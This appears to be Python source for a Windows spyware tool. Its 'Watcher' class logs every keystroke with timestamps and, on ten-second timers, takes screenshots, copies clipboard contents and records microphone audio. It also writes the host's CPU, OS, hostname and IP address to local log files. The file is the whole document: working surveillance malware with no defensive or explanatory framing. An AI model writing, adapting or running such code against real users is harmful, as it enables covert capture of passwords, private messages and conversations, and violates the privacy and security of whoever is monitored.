from pynput.keyboard import Listener
from mss import mss
from threading import Timer, Thread
from settings.Controls import file_path, sysinfo_log, keylog_log, clipboard_contents, screenshots_capture, microphone_record, extend
from scipy.io.wavfile import write
import socket
import platform
import os
import time
import win32clipboard
import sounddevice as sd

class IntervalHelper(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

class Watcher:

    def _on_press(self, k):
        with open(file_path + extend + keylog_log, "a") as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _log_directory_checker(self):
        if not os.path.exists(file_path):
            os.mkdir(file_path)

    def _logger(self):
        with Listener(on_press=self._on_press) as listener:
            listener.join()

    def _screencapture(self):
        sct = mss()
        sct.shot(output=file_path + extend + screenshots_capture.format(time.time()))
    
    def _get_clipboard(self):
        with open(file_path + extend + clipboard_contents, "a") as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()

                f.write("Clipboard Contents: \n" + pasted_data + "\n")
            except:
                f.write("There's nothing to copy at this time.")

    def _record_microphone(self):
        fs = 44100
        seconds = 10

        recorded_audio = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write(file_path + extend + microphone_record, fs, recorded_audio)

    def _sys_info(self):
        with open(file_path + extend + sysinfo_log, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)

            f.write("CPU: " + (platform.processor() + "\n"))
            f.write("System: " + platform.system() + " " + platform.version() + "\n")
            f.write("Machine: " + platform.machine() + "\n")
            f.write("Hostname: " + hostname + "\n")
            f.write("IP Address: " + IPAddr + "\n")

    def run(self, interval=10):
        self._log_directory_checker()
        Thread(target=self._logger).start()
        Thread(target=self._sys_info).start()

        IntervalHelper(interval, self._screencapture).start()
        IntervalHelper(interval, self._get_clipboard).start()
        IntervalHelper(interval, self._record_microphone).start()

if __name__ == "__main__":
    watch = Watcher()
    watch.run()
